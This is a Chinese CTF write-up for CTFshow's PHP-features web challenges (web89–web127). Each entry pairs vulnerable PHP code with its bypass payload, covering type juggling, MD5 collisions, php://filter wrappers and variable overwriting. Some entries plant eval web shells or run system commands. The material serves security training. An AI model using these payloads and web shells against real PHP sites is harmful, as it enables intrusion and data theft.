---
title: "CTFshow php特性"
date: 2022-08-07 17:55:55
---
# web 89

```php
<?php

include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
?>
```

[intval函数(获取变量的整数型)](https://www.runoob.com/php/php-intval-function.html)：如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0

[preg_match() 函数](https://www.runoob.com/php/php-preg_match.html)

利用数组绕过正则匹配，使其返回值发生错误而为false

`payload：?num[]=1`

# web 90

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

intval($num,0)：

如果 base 是 0，通过检测 var 的格式来决定使用的进制：

```
如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，
如果字符串以 “0” 开始，使用 8 进制(octal)；否则，
将使用 10 进制 (decimal)。
```

`payload：?num=010574` 这里我以0开始，意思就是后面的数字将被以8进制的形式读取

# web 91

```php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

考察点：正则表达式修饰符  
 拓展

```plaintext
i 
不区分(ignore)大小写

m
多(more)行匹配
若存在换行\n并且有开始^或结束$符的情况下，
将以换行为分隔符，逐行进行匹配
$str = "abc\nabc";
$preg = "/^abc$/m";
preg_match($preg, $str,$matchs);
这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。

s
特殊字符圆点 . 中包含换行符
默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符
$str = "abggab\nacbs";
$preg = "/b./s";
preg_match_all($preg, $str,$matchs);
这样匹配到的有三个 bg b\n bs

A
强制从目标字符串开头匹配;

D
如果使用$限制结尾字符,则不允许结尾有换行; 

e
配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 
```

满足第一个匹配：?cmd=%0aphp，同时不满足第二匹配(固定字符串”php”)

# web 92

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

payload：

`?num=0x117c`

这里我采用的是16进制绕过

# web93

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

这里直接八进制绕过?num=010574

# web94

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){ // 在这个地方需要返回的值不能为0，也就是说0不能在第一位
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

[strpos函数详解](https://php.p2hp.com/manual/zh/function.strpos.php)

所以?num=4476.0

# web 95

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){// 点匹配没了
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

利用八进制开头加号代替空格绕过?num=+010574

# web 96

```php
highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

paylaod:

```plaintext
./flag.php
/var/www/html/flag.php
php://filter/resource=flag.php
```

# web 97

```php
include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>
```

> php中hash比较缺陷
>
> [md5强碰撞收集](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)
>
> [【PHP】MD5比较漏洞 弱比较、强比较、强碰撞](https://blog.csdn.net/EC_Carrot/article/details/109525162)
>
> [MD5碰撞的一些例子](https://www.jianshu.com/p/c9089fd5b1ba)

md5弱类型比较可以直接数组绕过，其结果都会转换为null

```plaintext
a[]=1&b[]=2
```

如果进行了string强制转类型后，则不再接受数组

弱碰撞：

```plaintext
$a=(string)$a;
$b=(string)$b;
if(  ($a!==$b) && (md5($a)==md5($b)) ){
echo $flag;
}
md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。
payload: a=QNKCDZO&b=240610708
```

强碰撞：

```plaintext
$a=(string)$a;
$b=(string)$b;
if(  ($a!==$b) && (md5($a)===md5($b)) ){
echo $flag;
}
这时候需要找到两个真正的md5值相同数据

a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

# web98

```php
<?php

include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>
```

[php三元运算符与if的详解](https://www.php.cn/php-weizijiaocheng-383293.html)

[php函数的传值与传址(引用)详解](https://www.php.cn/php-notebook-172859.html)

既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG=flag就可以了

# web99

```php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

array_push() 函数：向数组尾部插入一个或多个元素

rand() 函数随机生成数组rand(min,max)

file_put_contents() 函数：写入函数

payload：

```php
?n=5.php
content=<?php @eval($_POST['hack']);?>
content=<?php system('cat flag36d.php');?>
```

# web100

```php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }    
}
?>
```

[php中OR与|| AND与&&的区别总结](https://www.jb51.net/article/42425.htm)

因为赋值的优先级(=)高于and所以 v 0 的 值 可 以 由 v0的值可以由 v0的值可以由v1来控制，所以我们需要给其赋值为1也就是true

因为flag在类ctfshow中，所以可以直接命令执行

```plaintext
?v1=1&v2=var_dump($ctfshow)&v3=;
v1=1&v2=system("cat ctfshow.php")/*&v3=*/;
```

# web101

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

?> 
```

这里牵扯到的是一个反射类的问题

[php反射类 ReflectionClass使用例子](https://ask.dcloud.net.cn/article/631)

[PHP的反射类ReflectionClass、ReflectionMethod使用实例](https://www.huaweicloud.com/articles/12460007.html)

[反射在 PHP 中的应用](https://learnku.com/articles/7538/the-application-of-reflection-in-php)

利用new一个反射类，直接打印其信息

**payload：**`?v1=1&v2=echo new ReflectionClass&v3=;`

```plaintext
<?php
class hacker{
	public $hackername = "yn8rt";
	const  yn8rt='nb666';
	public  function show(){
	echo $this->name,'<br>';
	}
}
//有这么一个hacker类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射
//现在我可以通过反射来获取这个类中的方法，属性，常量

//通过反射获取类的信息

$reflection = new ReflectionClass('hacker');//实例化反射对象,映射hacker类的信息
$consts = $reflection->getConstants();//获取所有常量
$props = $reflection->getProperties();//获取所有属性
$methods = $reflection->getMethods();//获取所有方法
var_dump($consts);
var_dump($props);
var_dump($methods);
?>
```

**返回值**

```plaintext
array(1) {
  ["yn8rt"]=>
  string(5) "nb666"
}
array(1) {
  [0]=>
  &object(ReflectionProperty)#2 (2) {
    ["name"]=>
    string(10) "hackername"
    ["class"]=>
    string(6) "hacker"
  }
}
array(1) {
  [0]=>
  &object(ReflectionMethod)#3 (2) {
    ["name"]=>
    string(4) "show"
    ["class"]=>
    string(6) "hacker"
  }
}
```

如果没有指定方法的话，就会像题目中默认输出很多东西：

1.常量 Contants  
2.属性 Property Names  
3.方法 Method Names静态  
4.属性 Static Properties  
5.命名空间 Namespace  
6.Person类是否为final或者abstract  
7.Person类是否有某个方法

# web102

```php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);// 这里的意思是从第二位开始截取
    $str = call_user_func($v1,$s);// 回调函数，第一个参数为调用的函数，其余的为调用参数的值
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}

?>
```

[PHP substr() 函数](https://www.runoob.com/php/func-string-substr.html)

[PHP hex2bin() 函数](https://www.runoob.com/php/func-string-hex2bin.html)：参数只有一个，将传入的参数(16进制转换为ascii字符)

首先还是赋值与and的优先级问题，所以就要保证v2传入的值为经过is_numeric函数判断后返回的结果为true，然后就是利用回调函数来实现读取操作

所以就可以这么利用啊：

post:v1=hex2bin

get：?v2=0x3c3f706870206576616c28245f504f53545b27796e275d293b3f3e&v3=yn.php

上面的16进制解码ascii：php eval($_POST['yn']);?

但是有个什么问题：

```plaintext
var_dump(is_numeric("0x66"));// 在php5中返回值为true
var_dump(is_numeric("0x66"));// 在php7中返回值为false
```

本题的环境就是php7

**方法二**

利用[base64](https://so.csdn.net/so/search?q=base64&spm=1001.2101.3001.7020)，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊：

```plaintext
$a='<?=`cat *`;';
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //这里直接用去掉=的base64
输出   5044383959474e6864434171594473

带e的话会被认为是科学计数法，可以通过is_numeric检测。
大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。
```

```plaintext
?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
```

post：v1=hex2bin

然后访问1.php去触发就可以了

```plaintext
ctfshow{98ff0fa4-7a07-4277-b7da-b20802f852ca}
```

# web103

```php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?>
```

比上一题多过滤了一个php，只是为了让写入的文件中没有php，但是不影响我们，用上题的思路即可得到答案。

# web104 106

```php
 <?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}

?>
```

[sha1函数](https://php.p2hp.com/manual/zh/function.sha1.php)

没有强制类型转换的话，sha1是无法识别数组的，直接就是数组绕过了

```plaintext
payload：
GET：?v2[]=1
POST：v1[]=2
```

# web105

```php
<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?> 
```

知识点：

```plaintext

$$的变量覆盖

GET和POST获得的参数是以键值对的形式存储的
```

分析：

第一个foreach是GET的键不能是error，第二个是POST的值不能是flag

题目一共有三个变量 $error $suces $flag我们只要令其中任意一个的值为flag，都是可以通过die或者直接echo输出的。

通过die($error)输出：

```plaintext
payload：
GET:?suces=flag
POST:error=suces
```

分析GET请求

```plaintext
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
//当传入suces=flag时，实际上执行的是$suces=$flag
//即把flag赋值给了suces变量
```

分析：POST请求

```plaintext
foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
 
//传入error=suces,得到$error=$suces=$flag
//即成功把flag的值赋给了error变量
```

# web107

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }

}

?>
```

[parse_str函数](https://php.p2hp.com/manual/zh/function.parse-str.php)

第二个参数：可选。规定存储变量的数组名称。该参数指示变量存储到数组中。

利用md5碰撞：使得v1中的flag=0，然后v3=0(md5(QNKCDZO)=0e…)，以0e开头的会被科学计数法认为0

payload：`vl=flag=0，v3=QNKCDZO`

md5弱碰撞：

```plaintext
0e开头的md5和原值：
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```

# web108

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
error
```

[strrev函数](https://php.p2hp.com/manual/zh/function.strrev.php)

[intval函数](https://php.p2hp.com/manual/zh/function.intval.php)

ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配

[php中ereg函数的截断漏洞](https://blog.csdn.net/qq_25987491/article/details/79952393)

0x36d=877，因为会被反转所以需要778来提前反转，同时需要截断处理，所以`c=d%00778`经过反转后取整就是877

# web109

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}

?>
```

```plaintext
PHP异常处理 、嵌套执行
通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果（如果存在返回）
只要是变量后面紧跟着（），那么对这个变量进行函数调用。例如$a = 'phpinfo'; $a(）即调用phpinfo（）
```

因为只要有字母就行，所以利用PHP已有的类闭合一下(预防意外的报错导致程序无法正常执行)，然后构造命令执行即可。

```plaintext
?v1=Exception();system("ls");//&v2=a
?v1=ReflectionClass&v2=system("ls")
?v1=ReflectionClass("PDO");system("ls");//&v2=a
```

[反射 | PDO](http://blog.uiste.com/2015/20151018-1.html)

# web110

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}

?>
```

FilesystemIterator获取目录文件[FilesystemIterator](http://phpff.com/filesystemiterator)

getcwd()函数取得当前工作目录[getcwd()函数](https://www.runoob.com/php/func-directory-getcwd.html)

构造playload：

`v1=FilesystemIterator&v2=getcwd`

得到当前目录的第一个文件名字：fl36dga.txt，然后访问即可，缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。因为FilesystemIterator一次只会得到一个文件名。

# web111

```php
 <?php
     
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}

if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}

?>
```

```plaintext
php超全局变量$GLOBALS的使用

GLOABALS 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

PHP生命周期中，定义在函数体外部的所谓全局变量，函数内部是不能直接获得的。即外部变量，函数内部是无法访问的，除非给函数传参数

例如：

    $a=123;
    $b=456;
    var_dump($GLOBALS);

返回内容较多就不一一列出了。我们只看最后两条，发现我们自行定义的变量会被输出

  ["a"]=>

  int(123)

  ["b"]=>

  int(456)
```

分析：

所以对于该题，只要把$GLOBALS赋值给v2，然后v2再赋值给v1,经过getFlag之后，eval($ctfshow=&$GLOBALS;)，即将变量ctfshow指向变量GLOBALS的地址即两个等价，实现var_dump($ctfshow)=var_dump($GLOBALS)的操作，即可将全部变量输出

```plaintext
payload:?v1=ctfshow&v2=GLOBALS
```

# web112

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

知识点：

```plaintext
is_file  判断给定文件名是否为一个正常的文件，filename为文件的路径。
//is_file函数可以使用包装器伪协议来绕过，当is_file的参数为伪协议时，返回值为false
//不影响file_get_contents highlight_file
```

分析：

我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议

```plaintext
payload:
可以直接用不带任何过滤器的filter伪协议
?file=php://filter/resource=flag.php
 
也可以用一些没有过滤掉的编码方式和转换方式
?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
?file=compress.zlib://flag.php
?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
```

# web113

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 
```

方法1:

```javascript
payload:?file=compress.zlib://flag.php
```

方法2:

知识点：

```
在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容。多次重复后绕过is_file。大佬的解释是:超过20次软连接后就可以绕过is_file

这里使用的是PHP最新版的小Trick，require_once包含的软链接层数较多时once 的 hash 匹配会直接失效造成重复包含（目录溢出）

php源码分析 require_once 绕过不能重复包含文件的限制
```

方法：

```plaintext
payload:?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
```

# web114

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 师傅们居然tql都是非预期 哼！
```

`?file=php://filter/resource=flag.php`

# web115

```php
 <?php

include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} hacker!!!
```

知识点：

```plaintext
is_numeric() 检测变量是否为数字或数字字符串

trim() 去除字符串首尾处的空白字符（或者其他字符）、如果不指定第二个参数，trim() 将去除这些字符：

    " " (ASCII 32 (0x20))，普通空格符。
    "\t" (ASCII 9 (0x09))，制表符。
    "\n" (ASCII 10 (0x0A))，换行符。
    "\r" (ASCII 13 (0x0D))，回车符。
    "\0" (ASCII 0 (0x00))，空字节符。（空字符）  %0c也相当于空字符
    "\x0B" (ASCII 11 (0x0B))，垂直制表符

chr() 返回ascii 所对应的单个字符。

此函数与 ord() 是互补的。ord() 转换字符串第一个字节为 0-255 之间的值chr() 
```

分析：

is_numeric($num)要求num识别为数字，但num不能强等于“36“

trim($num)!==’36’要求不能强等于”36“,然后filter之后要弱等于36

$num==’36’但最后要求弱等于”36”

如何绕过is_numeric()和trim()? Fuzz测试一下

测试is_numeric

```plaintext
<?php
for ($i=0; $i <128 ; $i++) {
	$x=chr($i).'36';
	if(is_numeric($x)===true){
		echo urlencode(chr($i))."\n";
	}
}
 
//输出%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9
```

测试trim和numeric

```plaintext
<?php
for($i=0;$i<=128;$i++) {
	$x=chr($i).'36';
	if(trim($x)!=='36' &&is_numeric($x)){
		echo urlencode(chr($i))."\n";
	}
}
 
//输出结果%0C %2B - . 0 1 2 3 4 5 6 7 8 9
```

除去被过滤的+ - . 只剩下%0c ，也就是换页符\f

```plaintext
payload:?num=%0c36
```

对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍

# web123

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?> 
```

此处的php特性：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：CTF[SHOW.COM=>CTF_SHOW.COM

`payload：CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag`

# web125

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

[$argv](https://www.php.net/manual/zh/reserved.variables.argv.php)：传递给脚本的参数数组

[详解 $_SERVER 函数中QUERY_STRING和REQUEST_URI区别(转)](https://www.cnblogs.com/luomir/p/5129875.html)

```plaintext
$_SERVER['argv']：

1、cli模式（命令行）下

	第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数

2、web网页模式下

	在web页模式下必须在php.ini开启register_argc_argv配置项
	
    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果

    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]

    $argv,$argc在web模式下不适用
```

我们是在网页模式下的，注意重点：  
 `$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]`  
 而 `$_SERVER[‘QUERY_STRING’]` **是获取查询语句，也就是?后面的语句**

举个例子

```plaintext
?$fl0g=flag_give_me
$a[0]=$_SERVER['argv'][0]=$_SERVER[‘QUERY_STRING’]=>$fl0g=flag_give_me
```

payload：

```plaintext
CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0]) # POST
?$fl0g=flag_give_me; #GET
CTF_SHOW=6&CTF[SHOW.COM=6&fun=highlight_file($_GET[1])    #POST
?1=flag.php		#GET
```

# web126

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

比上一题多过滤了一个；

我们可以使用assert()绕过

```plaintext
assert() 断言：

PHP 5
bool assert ( mixed $assertion [, string $description ] )

PHP 7
bool assert ( mixed $assertion [, Throwable $exception ] )

如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行
可见，eval和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加
?$fl0g=flag_give_me
CTF_SHOW=6&CTF[SHOW.COM=6&fun=assert($a[0])
```

# web127

```plaintext
 <?php

error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];

//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}

